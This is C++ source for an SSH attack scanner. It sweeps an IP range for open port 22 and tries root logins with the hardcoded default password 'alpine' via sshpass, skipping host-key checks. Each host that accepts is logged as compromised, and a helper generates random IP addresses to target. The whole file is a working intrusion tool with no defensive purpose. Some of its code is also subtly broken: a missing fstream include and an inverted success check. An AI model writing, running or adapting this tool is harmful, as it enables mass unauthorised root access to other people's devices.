#include <sys/fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <syslog.h>
#include <errno.h>
#include <ifaddrs.h>
#include <string.h>
#include <iostream>
#include <sstream>

static std::ofstream logfile;

#define MAX_NUM 24
#define VULN_PASS "alpine"

using namespace std;

void scan(char *ipaddr);
int scanHost(char* host);
int checkHost(char *host);
char *randHost(void);
int main();

void scan(char *ipaddr)
{
    int b1, b2, b3, b4;
char dot;
istringstream s(ipaddr);
s >> b1 >> dot >> b2 >> dot >> b3 >> dot >> b4 >> dot;
//cout<<"1 "<<b1<<" 2 "<<b2<<" 3 "<<b3<<" 4 "<<b4<<endl;
logfile.open("connection.txt", std::fstream::app);
    int loop3;
    for (loop3=b3; loop3<=255; loop3++)
    {
        int loop4;
        for (loop4=b4; loop4<=255; loop4++)
        {
			char* host;
			asprintf(&host, "%i.%i.%i.%i", b1, b2,loop3, loop4);
			printf("\n\r[ + ]Scanning: %s", host);
			if(scanHost(host)==0){
				printf("\n\r - %s is open",host);
				if(checkHost(host)==0){
					logfile << "fucked host "<<host<<"\n" << std::endl;
					//printf("\n\r - %s is inside",host);
           }
         }
        }
    }
}

int scanHost(char* host)
{
    int res, valopt, soc;
    struct sockaddr_in addr;
    long arg;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    soc = socket(AF_INET, SOCK_STREAM, 0);
    arg = fcntl(soc, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(soc, F_SETFL, arg);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(22);
    addr.sin_addr.s_addr = inet_addr(host);
    res = connect(soc, (struct sockaddr *)&addr, sizeof(addr));
    if (res < 0) {
      if (errno == EINPROGRESS) {
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(soc, &myset);
        if (select(soc+1, NULL, &myset, NULL, &tv) > 0) {
            lon = sizeof(int);
            getsockopt(soc, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
            if (valopt) {
              return -1;
            }
        }
        else {
            return -1; }
      }
      else { return -1; }
    }
    close(soc);
    return 0;
}

int checkHost(char *host)
{
    FILE *in;
    char buff[512];
    char *execLine;
    asprintf(&execLine, "sshpass -p %s ssh -o StrictHostKeyChecking=no root@%s 'echo 99'", VULN_PASS, host);
    in = popen(execLine, "r");
        
    while (fgets(buff, 2, in) != NULL ) {
        if (strcmp(buff, "99"))
            return 0;
    }
    pclose(in);
    return -1; // NOT VULN
}

char *randHost(void)
{
    int a,x,y,z;
    char *retme;
    srand (time (0)); 
    a=random() % 255;
    x=random() % 255;
    y=random() % 255;
    z=random() % 255;
    asprintf(&retme, "%i.%i.%i.%i.", a,x,y,z);
    return retme;
}

int main(){
char *vod = "192.168.1.50";
scan(vod);

//cout<<rrange<<endl;
}
